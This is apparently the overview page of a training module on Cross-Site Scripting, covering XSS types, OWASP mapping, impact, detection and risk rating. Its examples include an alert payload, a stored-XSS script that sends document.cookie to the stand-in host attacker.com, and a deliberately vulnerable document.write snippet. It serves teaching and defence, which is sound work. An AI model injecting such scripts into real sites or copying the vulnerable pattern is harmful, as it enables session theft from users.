# Cross-Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When a victim loads the compromised page, the malicious script executes in their browser, potentially stealing cookies, session tokens, or performing actions on behalf of the user.

## OWASP Mapping

- **OWASP Top 10 2021**: A03:2021 – Injection
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP ASVS v4.0**: V5.3 (Output Encoding and Injection Prevention)

## Types of XSS

### 1. Reflected XSS
The malicious script is reflected off a web server, such as in search results, error messages, or any response that includes user input without proper sanitization.

**Example**: A search parameter is directly displayed on the page without encoding.
```
http://example.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS (Persistent XSS)
The malicious script is permanently stored on the target server (database, forum post, comment field) and executed when users view the infected page.

**Example**: Comment section that doesn't sanitize input:
```html
<div class="comment">
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
</div>
```

### 3. DOM-based XSS
The vulnerability exists in client-side code rather than server-side. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.

**Example**: JavaScript that directly uses URL parameters:
```javascript
var search = window.location.search;
document.write("You searched for: " + search);
```

## Common Attack Vectors

1. **User Input Fields**: Search boxes, forms, comment sections
2. **URL Parameters**: Query strings, fragments
3. **HTTP Headers**: User-Agent, Referer, Cookie
4. **File Uploads**: SVG files with embedded scripts
5. **Rich Text Editors**: HTML content with malicious scripts

## Business Impact

- **Session Hijacking**: Stealing authentication cookies/tokens
- **Credential Theft**: Capturing keystrokes or form data
- **Phishing**: Injecting fake login forms
- **Defacement**: Modifying page content
- **Malware Distribution**: Redirecting to malicious sites
- **Account Takeover**: Performing actions as the victim

## Real-World Use Cases

### Use Case 1: E-commerce Platform
An attacker injects XSS in a product review. When customers view the product page, their session cookies are stolen, allowing the attacker to make purchases using their accounts.

### Use Case 2: Social Media Platform
A stored XSS vulnerability in profile bio fields allows an attacker to create a self-propagating worm that automatically posts malicious content from infected accounts.

### Use Case 3: Corporate Intranet
Reflected XSS in an internal application allows attackers to craft phishing emails with malicious links that appear legitimate, stealing employee credentials.

## Detection Techniques

1. **Manual Testing**:
   - Submit common XSS payloads in all input fields
   - Check if input is reflected in response without encoding
   - Test different contexts (HTML, JavaScript, CSS, URL)

2. **Automated Scanning**:
   - Use Burp Suite Scanner
   - OWASP ZAP active scan
   - Custom scripts with polyglot payloads

3. **Code Review**:
   - Look for direct output of user input
   - Check for missing output encoding
   - Review JavaScript DOM manipulation

## Risk Rating

**CVSS v3.1 Base Score**: 6.1 (Medium) to 8.8 (High) depending on context

**Factors affecting severity**:
- Stored vs Reflected
- Privilege level of affected users
- Access to sensitive data
- Availability of HttpOnly and Secure flags on cookies

## Next Steps

Explore the following files in this module:

1. **[burp/reflected-xss.http](./burp/reflected-xss.http)** - Sample Burp Suite request/response with explanation
2. **[payloads.md](./payloads.md)** - Common XSS payloads with annotations
3. **[reproduce.md](./reproduce.md)** - Step-by-step reproduction guide
4. **[remediation.md](./remediation.md)** - Developer guidance for fixing XSS
5. **[examples/](./examples/)** - Worked examples with full attack scenarios

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

**Remember**: Only test for XSS vulnerabilities on systems you own or have explicit written permission to test. Unauthorized testing is illegal.
